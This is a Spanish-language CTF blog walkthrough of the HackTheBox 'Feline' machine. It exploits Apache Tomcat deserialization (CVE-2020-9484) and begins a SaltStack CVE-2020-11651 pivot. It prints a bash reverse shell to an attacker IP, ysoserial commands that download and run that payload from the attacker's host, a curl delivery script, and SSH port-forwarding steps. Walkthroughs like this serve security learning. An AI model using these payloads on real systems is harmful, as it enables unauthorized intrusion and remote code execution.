<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/lanz2.png">

<title>HackTheBox - Feline</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Feline | Sh0x blog</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackTheBox - Feline" />
<meta name="author" content="lanz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Máquina Linux nivel difícil. Beleza irmão! De cabezota nos encontraremos con serialización de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que está corriendo Docker localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker.sock" />
<meta property="og:description" content="Máquina Linux nivel difícil. Beleza irmão! De cabezota nos encontraremos con serialización de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que está corriendo Docker localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker.sock" />
<link rel="canonical" href="http://localhost:4000/htb/feline" />
<meta property="og:url" content="http://localhost:4000/htb/feline" />
<meta property="og:site_name" content="Sh0x blog" />
<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274banner.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-02-20T00:00:00-08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274banner.png" />
<meta property="twitter:title" content="HackTheBox - Feline" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-02-20T00:00:00-08:00","datePublished":"2021-02-20T00:00:00-08:00","description":"Máquina Linux nivel difícil. Beleza irmão! De cabezota nos encontraremos con serialización de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que está corriendo Docker localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker.sock","headline":"HackTheBox - Feline","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/feline"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/feline"}</script>
<!-- End Jekyll SEO tag -->

    
<link href="/assets/css/prism.css" rel="stylesheet">

<link href="/assets/css/theme.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>


<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h3>El tiempo a destiempo</h3>
        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
        <li><a href="/categories#article">Artículos</a></li>
        <li><a href="/categories#htb">HackTheBox</a></li>
        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
    </ul>   
</nav>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>


<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">HackTheBox - Feline</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
            
        </div>            
        <div>
        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
        <span class="post-date"><time class="post-date" datetime="2021-02-20">20 Feb 2021</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274banner.png" alt="HackTheBox - Feline">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    <!-- End Toc -->
    <p>Máquina Linux nivel difícil. Beleza irmão! De cabezota nos encontraremos con serialización de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que está corriendo <strong>Docker</strong> localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker.sock</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274felineHTB.png" alt="274felineHTB" /></p>

<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>

<p><strong>Creadores</strong>: <a href="https://www.hackthebox.eu/profile/8308">MinatoTW</a> &amp; <a href="https://www.hackthebox.eu/profile/13531">MrR3boot</a>.</p>

<p>Holas, ¿cómo están?</p>

<p>Bueno, empezaremos jugando con <code>deserialización/serialización</code> de objetos <code>.JSP</code>, directamente obtendremos una Shell como el usuario <code>tomcat</code> en el sistema…</p>

<p>Enumerando los procesos activos encontraremos sobre el puerto <code>4506</code> del <code>localhost</code> el servicio <code>SaltStack</code>. Estará corriendo en un contenedor de <code>Docker</code>. Jugaremos con <code>Remote Port Forwarding</code>, después usaremos un exploit que nos permite ejecutar una reverse Shell para posicionarnos en la raíz del contenedor como el usuario <code>root</code>.</p>

<p>Curiosamente el archivo <code>.bash_history</code> va a tener contenido, lo que nos permita percatarnos del demonio que tiene dentro el sistema (sonó chévere :P), <code>docker.sock</code>. Usaremos los privilegios que tiene el <code>daemon</code> para obtener una Shell en un contenedor que crearemos, pero que al mismo tiempo nos creara una montura de toda la raíz del sistema.</p>

<h4 id="clasificación-de-la-máquina">Clasificación de la máquina.</h4>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>

<p>Va pa la realidad, cero juegos eh!</p>

<blockquote>
  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
</blockquote>

<p>…</p>

<ol>
  <li><a href="#enumeracion">Enumeración</a>.</li>
  <li><a href="#explotacion">Explotación</a>.</li>
  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
</ol>

<p>…</p>

<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>

<p>Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.</p>

<pre><code class="language-bash">–» nmap -p- --open -v 10.10.10.205 -oG initScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td style="text-align: left">Escanea todos los 65535</td>
    </tr>
    <tr>
      <td>–open</td>
      <td style="text-align: left">Solo los puertos que están abiertos</td>
    </tr>
    <tr>
      <td>-v</td>
      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">–» cat initScan 
# Nmap 7.80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10.10.10.205
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.205 ()   Status: Up
Host: 10.10.10.205 ()   Ports: 22/open/tcp//ssh///, 8080/open/tcp//http-proxy///
# Nmap done at Wed Dec 16 25:25:25 2020 -- 1 IP address (1 host up) scanned in 161.07 seconds
</code></pre>

<p>Muy bien, ¿que tenemos?</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>22</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Conexion remota segura mediante una shell</td>
    </tr>
    <tr>
      <td>8080</td>
      <td style="text-align: left"><strong><a href="https://www.xataka.com/basics/que-es-un-proxy-y-como-puedes-utilizarlo-para-navegar-de-forma-mas-anonima">HTTP Proxy</a></strong>: Intermediario en las peticiones de recursos que realiza un cliente a un servidor</td>
    </tr>
  </tbody>
</table>

<p>Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:</p>

<pre><code class="language-bash">–» nmap -p 22,8080 -sC -sV 10.10.10.205 -oN portScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p</td>
      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
    </tr>
    <tr>
      <td>-sC</td>
      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
    </tr>
    <tr>
      <td>-sV</td>
      <td style="text-align: left">Nos permite ver la versión del servicio</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td style="text-align: left">Guarda el output en un archivo</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">–» cat portScan 
# Nmap 7.80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p 22,8080 -sC -sV -oN portScan 10.10.10.205
Nmap scan report for 10.10.10.205
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 16 25:25:25 2020 -- 1 IP address (1 host up) scanned in 19.65 seconds
</code></pre>

<p>Tenemos:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Puerto</th>
      <th style="text-align: left">Servicio</th>
      <th style="text-align: left">Versión</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">22</td>
      <td style="text-align: left">SSH</td>
      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4</td>
    </tr>
    <tr>
      <td style="text-align: left">8080</td>
      <td style="text-align: left">HTTP</td>
      <td style="text-align: left">Apache Tomcat 9.0.27</td>
    </tr>
  </tbody>
</table>

<p>…</p>

<h3 id="puerto-8080">Puerto 8080 <a href="#puerto-8080">⌖</a></h3>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274page8080.png" alt="274page8080" /></p>

<p>El único recurso funcional es este:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274page8080_service.png" alt="274page8080_service" /></p>

<p>Lo cual nos permite subir un archivo, por medio de <code>JSP</code> (JavaServer Pages, es similar a <strong>PHP</strong>, pero es usado por <strong>Java</strong>). Si interceptamos por medio de <code>BurpSuite</code> la petición, vemos su estructura:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274burp8080_service.png" alt="274burp8080_service" /></p>

<p>Podemos modificar el contenido del archivo que subamos. Si subimos una imagen nos muestra este error:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274burp8080_service_upimage.png" alt="274burp8080_service_upimage" /></p>

<p>Vemos una ruta, posiblemente donde se estén guardando los archivos después de ser subidos… Probando webshells, reverseshell, simples <code>hello</code>, etc. Y jugando con esa ruta no podía conseguir nada. Volviendo atrás para ver que tenía encontre una vulnerabilidad que me llamo la atención hacia <code>Apache tomcat 9.0.27</code>:</p>

<ul>
  <li><a href="https://www.cybersecurity-help.cz/vdb/SB2020052124">Remote Code Execution in Apache Tomcat - Deserialization Untrusted Data</a>.</li>
  <li><a href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">Apache Tomcat RCE by deserialization (CVE-2020-9484)</a>.</li>
</ul>

<p>Básicamente la serialización de un objeto se basa en codificar el mismo para transmitirlo a través de una red, viajará como una serie de <strong>bytes</strong> o en un formato legible para el receptor. La serie de bytes o el formato pueden ser usados para crear un nuevo objeto que es idéntico en todo al original. Esto en resumidas palabras basado en la <a href="https://es.wikipedia.org/wiki/Serializaci%C3%B3n">Wikipedia</a>.</p>

<ul>
  <li><a href="https://www.scielo.sa.cr/pdf/tem/v29n1/0379-3982-tem-29-01-00118.pdf">Más info sobre serialización y deserializacion (PDF)</a>.</li>
  <li><a href="https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/">Aprende que es deserialización</a>.</li>
</ul>

<p>Indagando ya en que debemos tener para poder explotar esta vulnerabilidad, tenemos:</p>

<ol>
  <li>El atacante (nosotros) debe tener capacidad de subir un archivo con contenido arbitrario. Y conocer donde está siendo almacenado (probablemente lo sepamos).</li>
  <li>Se debe tener habilitado el <code>PersistentManager</code> y que esté usando <code>FileStore</code>… (Ya hablaremos un poco de ello abajo).</li>
  <li>Que existan “gadgets” en el <code>classpath</code> que puedan ser usados para deserializar objetos.</li>
</ol>

<p>Bueno pues el primero lo cumplimos, el segundo y el tercero deberíamos probarlo. Y ver si en algún momento vemos algo. Hablemos de <code>PersistentManager</code>:</p>

<p>Funciona como gestor de sesiones, sabiendo que estas sirven para mantener el estado entre peticiones de usuarios. Por default la configuración cuenta con <code>StandardManager</code>, pero depende del admin cambiarlo a <code>PersistentManager</code>. <code>StandardManager</code> permite que las sesiones de usuario se guarden en la memoria, después de que <strong>tomcat</strong> sea cerrado pasara las sesiones al disco en un objeto serializado…</p>

<p><code>PersistentManager</code> hace lo mismo, pero si una sesión ha estado suficiente tiempo inactiva la pasara al disco, esto para reducir el uso de memoria.</p>

<p>Uno puede elegir como y donde quiere que las sesiones sean almacenadas:</p>

<ul>
  <li><code>FileStore</code>: Se especifica una carpeta en el disco, ahí se guardaran las sesiones dependiendo su ID.</li>
  <li><code>JDBCStore</code>: Se especifica una tabla en la base de datos, donde cada sesión se guarda por fila.</li>
</ul>

<p>La mayoría de la info la pueden encontrar acá:</p>

<ul>
  <li><a href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">Apache Tomcat Deserialization - Redtimmy.com</a>.</li>
  <li><a href="https://tomcat.apache.org/tomcat-5.5-doc/catalina/docs/api/org/apache/catalina/session/PersistentManager.html">PersistentManager - apache.org</a>.</li>
  <li><a href="https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4">Apache Tomcat Deserialization Untrusted Data - Medium.com/@romnenko</a>. <strong>OJO</strong></li>
</ul>

<p>…</p>

<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>

<p>Perfecto, pues enumerando aún más encontré un PoC donde explica como subir varios objetos serializados para finalmente conseguir una reverse Shell:</p>

<ul>
  <li><a href="https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4">Apache Tomcat Deserialization Untrusted Data - Medium.com/@romnenko</a>.</li>
</ul>

<p>Los pasos que debemos seguir son sencillos y fáciles de entender:</p>

<ol>
  <li>Crear archivo <code>bash</code> donde tengamos la petición hacia nuestra máquina. (Para cuando se ejecute obtener la reverse Shell)</li>
  <li>Crear objetos serializados: Uno para subir el payload, otro para darle permisos y otro para ejecutarlo.</li>
  <li>Ponernos en escucha :P</li>
  <li>Ejecutar las peticiones.</li>
</ol>

<p>Démosle:</p>

<pre><code class="language-bash">–» cat ejeje.sh 
#!/bin/bash

bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.152/4433 0&gt;&amp;1"
</code></pre>

<p>Ahora creamos los objetos serializados, usaremos la misma herramienta que él, <a href="https://github.com/frohoff/ysoserial#installation"><strong>ysoserial</strong></a>.</p>

<pre><code class="language-bash">#Lo subimos a la maquina y lo guardamos en la ruta /tmp/ejeje.sh
–» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'curl http://10.10.14.152:8000/ejeje.sh -o /tmp/ejeje.sh' &gt; downloadPayload.session
#Le damos permisos totales
–» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'chmod 777 /tmp/ejeje.sh' &gt; chmodPayload.session
#Ejecutamos
–» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash /tmp/ejeje.sh' &gt; executePayload.session
</code></pre>

<pre><code class="language-bash">–» ls
chmodPayload.session  downloadPayload.session  ejeje.sh  executePayload.session  ysoserial-master-6eca5bc740-1.jar
</code></pre>

<p>El creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas:</p>

<pre><code class="language-bash">–» cat todotaskbro.sh 
#!/bin/bash

email="hola@hola.com"
route_upload="../../opt/tomcat/temp
#route_upload="../../../opt/samples/uploads"

echo -e "\n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ download +++++++++++++++++++++++++++++++++\n\n"

curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/downloadPayload" -F 'image=@downloadPayload.session'
curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/downloadPayload"
sleep 1

echo -e "\n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ chmod +++++++++++++++++++++++++++++++++\n\n"

curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/chmodPayload" -F 'image=@chmodPayload.session'
curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/chmodPayload"
sleep 1

echo -e "\n\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ execute ++++++++++++++++++++++++++++++++++\n\n"

curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/executePayload" -F 'image=@executePayload.session'
curl -X POST http://10.10.10.205:8080/upload.jsp?email=$email -H "Cookie:JSESSIONID=$route_upload/executePayload"
</code></pre>

<p>El creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas:
La forma de la petición coincide en varios ítems, solo modificaremos el header y la URL.</p>

<p>Él tiene como ruta donde se están guardando las muestras a <code>/opt/samples/uploads/</code>. Nosotros obtuvimos una posible ruta cuando intentamos subir una imagen, podemos probar con esa y ver que obtenemos.</p>

<p>Levantemos un servidor web rápidamente con <code>Python</code>, pongámonos en escucha por medio de <code>netcat</code> y ejecutemos <code>todotaskbro.sh</code>:</p>

<pre><code class="language-bash">–» python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>

<pre><code class="language-bash">–» nc -nlvp 4433
listening on [any] 4433 ...
</code></pre>

<p>Ahora si ejecutemos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_todo_failroute.png" alt="274bash_todo_failroute" /></p>

<p>Pues nos indica que se ha subido el archivo (pero no obtenemos peticiones en nuestro servidor de Python) pero cuando lo intenta ejecutar nos dice <code>Invalid Request</code>… Probemos con la ruta que tenía el script original:</p>

<pre><code class="language-bash">...
route_upload="../../../opt/samples/uploads"
...
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_todo_done.png" alt="274bash_todo_done" /></p>

<p>Perfectooooooooooo, obtenemos nuestra Shell como el usuario <code>tomcat</code>… Pero ¿cómo? Si claramente estamos viendo que la página nos respondió con errores. Bueno lo explica claramente el <a href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">artículo donde encontramos inicialmente la vulnerabilidad</a>.</p>

<p>Al momento de realizar la deserializacion de los objetos todo va correcto y ejecuta nuestro código malicioso, el error se muestra cuando intenta interpretar los objetos como <strong>sesiones</strong>, que claramente no lo son. Pero pues en este punto como ya vimos, nuestro código ya se había ejecutado (:</p>

<p>Lindo lindo, con este usuario tenemos acceso a la flag del <code>user.txt</code>.</p>

<p>Haciendo un tratamiento de la TTY podemos obtener una Shell completamente interactiva, que nos permita autocompletar, evitar dar por error <code>CTRL + C</code> y quedarnos sin Shell y demás beneficios.</p>

<ul>
  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">S4vitar nos guia rapidamente (real, rapidamente)</a>.</li>
</ul>

<p>…</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>

<p>Enumerando y enumerando encontré algunas cosas interesantes; <code>puertos locochones</code> corriendo localmente:</p>

<pre><code class="language-bash">tomcat@VirusBucket:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:4505          0.0.0.0:*               LISTEN
tcp        0      0 localhost:4506          0.0.0.0:*               LISTEN
...
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN
...
</code></pre>

<p>Tenemos <code>docker</code> corriendo en la maquina:</p>

<pre><code class="language-bash">tomcat@VirusBucket:~$ ifconfig
...
docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:73ff:fe0d:a026  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 02:42:73:0d:a0:26  txqueuelen 0  (Ethernet)
        RX packets 1982  bytes 324390 (324.3 KB) 
        RX errors 0  dropped 0  overruns 0  frame 0               
        TX packets 2320  bytes 257398 (257.3 KB) 
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...
</code></pre>

<p>Revisemos el estado del servicio con <code>systemctl</code>:</p>

<pre><code class="language-bash">tomcat@VirusBucket:~$ systemctl status docker
● docker.service - Docker Application Container Engine
     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2020-12-19 18:13:52 UTC; 8h ago
TriggeredBy: ● docker.socket
       Docs: https://docs.docker.com
   Main PID: 930
      Tasks: 32
     Memory: 122.8M
     CGroup: /system.slice/docker.service
             ├─ 930 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
             ├─1288 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8000 -container-ip 172.17.0.2 -container-port 8000
             ├─1303 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4506 -container-ip 172.17.0.2 -container-port 4506
             └─1320 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4505 -container-ip 172.17.0.2 -container-port 4505

Warning: some journal files were not opened due to insufficient permissions.
</code></pre>

<p>Vemos los 3 puertos que encontramos antes, cada uno es un contenedor corriendo localmente… Acá no creí en lo que había encontrado inicialmente y me puse a sobre pensar las cosas, lo que me llevo a perder tiempo y ganarme un lindo <code>RabbitHole</code>, pero bueno, de eso se aprende:</p>

<p>Al principio que vi los puertos <code>4505</code> y <code>4506</code> me fui de una para la web a buscar que significado tenían esos puertos, pues los dos son manejados por el servicio <code>SaltStack</code>, que funciona como automatizado de eventos y tareas remotas, además de gestionar configuraciones, creado con <code>Python</code>.</p>

<ul>
  <li><a href="https://www.speedguide.net/port.php?port=4505">Info del puerto <code>4505</code></a>.</li>
  <li><a href="https://www.speedguide.net/port.php?port=4506">Info del puerto <code>4506</code></a>.</li>
</ul>

<p>Pues al ver eso no le preste atención y mientras que investigaba ya tenía en mi cabeza hacer <code>Remote Port Forwarding</code> y ver si encontrábamos algo diferente mediante la web o con <code>nmap</code>: Pues tome cada puerto e hice el forwarding, enumere cada servicio en la web, intente <code>netcat</code>, <code>telnet</code>, escanee con <code>nmap</code> (que creo que si me sirvió de algo) yyyy queme tiempo pensando que podría ser o que no estaba viendo…</p>

<p>El <code>Remote Port Forwarding</code> lo realicé con <code>SSH</code>, en el caso del puerto <code>8000</code> sería así:</p>

<pre><code class="language-bash">tomcat@VirusBucket:~$ ssh -R 8000:127.0.0.1:8000 root@10.10.14.152 -p 177
</code></pre>

<ul>
  <li>Le indicamos que queremos que sea <strong>Remote</strong> (<code>-R</code>).</li>
  <li>Tome el puerto <code>8000</code> que está sobre el localhost y lo monte en el puerto <code>8000</code> de mí máquina.</li>
  <li>Mi <code>SSH</code> lo tengo sobre el puerto <code>177</code>.</li>
</ul>

<p>El escaneo de <code>nmap</code> indicaba:</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>8000</td>
      <td style="text-align: left">CherryPy wsgiserver 18.6.0</td>
    </tr>
    <tr>
      <td>4505</td>
      <td style="text-align: left">ZeroMQ ZMTP 2.0</td>
    </tr>
    <tr>
      <td>4506</td>
      <td style="text-align: left">ZeroMQ ZMTP 2.0</td>
    </tr>
  </tbody>
</table>

<p>Busque vulnerabilidades sobre cada uno de ellos, pero no funcionaban o sencillamente no había.</p>

<p>Después del tiempo quemado, volvía tras e hice el <code>netstat -l</code> de nuevo. Tome los puertos <code>4505</code> y <code>4506</code> y busque exploits hacia <code>SaltStack</code>, <a href="https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652">pues encontré 2 que se aprovechan</a> de un modelo llamado <code>master-slave</code>, donde <code>master</code> es llamado <code>salt master</code> y <code>slave</code> se llama <code>salt minions</code>, entonces <code>salt master</code> es usado para enviar comandos y tareas (configuraciones) a los <code>salt minions</code>. En la vulnerabilidad, la función <code>ClearFuncs</code> no válida propiamente los metodos de llamado, ahi obtenemos una brecha que podemos aprovechar:</p>

<ul>
  <li><a href="https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652">Articulo de TrendMicro explicando las vulnerabilidades</a>.</li>
</ul>

<p>Una de las vulnerabilidades (CVE-2020-11652) nos permite ver archivos del sistema mediante un <code>Directory Path Traversal</code>. El otro (CVE-2020-11651) nos permite ejecución remota de comandos mediante un bypass auth. Inclinémonos por el segundo.</p>

<blockquote>
  <p>These can be exploited by remote, unauthenticated attackers, and all versions of SaltStack Salt before 2019.2.4 and 3000 before 3000.2 are affected. <a href="https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652">TrendMicro</a></p>
</blockquote>

<p>En github tenemos dos PoC’s:</p>

<ul>
  <li><a href="https://github.com/jasperla/CVE-2020-11651-poc">CVE-2020-11651 - Github/jasperla</a>.</li>
  <li><a href="https://github.com/dozernz/cve-2020-11651">CVE-2020-11651 - Github/dozernz</a>.</li>
</ul>

<p>Entonces lo primero que debemos hacer es hacer un <code>Remote Port Forwarding</code> de los dos puertos para ver cuál de los dos es vulnerable (o ninguno) :P (Pero pues sí, hay uno vulnerable porque o si no no hubiera escrito esto :P:P)</p>

<p>En nuestra máquina validamos que tenemos sobre ese puerto:</p>

<pre><code class="language-bash">–» lsof -i:4505
✗ ••• bAd •••· ~/sec/htb/feline/exploit
–» 
</code></pre>

<p>Hacemos el forwarding:</p>

<pre><code class="language-bash">tomcat@VirusBucket:~$ ssh -R 4505:127.0.0.1:4505 root@10.10.14.152 -p 177
</code></pre>

<p>Y volvemos a validar a ver si ya tenemos el servicio en nuestra maquina:</p>

<pre><code class="language-bash">–» lsof -i:4505
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd    164674 root    9u  IPv6 839839      0t0  TCP localhost:4505 (LISTEN)
sshd    164674 root   10u  IPv4 839840      0t0  TCP localhost:4505 (LISTEN)
</code></pre>

<p>La ejecución de los exploits también me llevo un poco entenderlo y básicamente fue por no leer. En el GitHub de cada uno tienen: <code>There's no interactivity implemented, youll need to catch a reverse shell</code>. Asi que si o si debemos obtener una shell :P</p>

<p>Pongámonos en escucha por el puerto <code>4434</code> de una :P</p>

<pre><code class="language-bash">–» nc -nlvp 4434
listening on [any] 4434 ...
</code></pre>

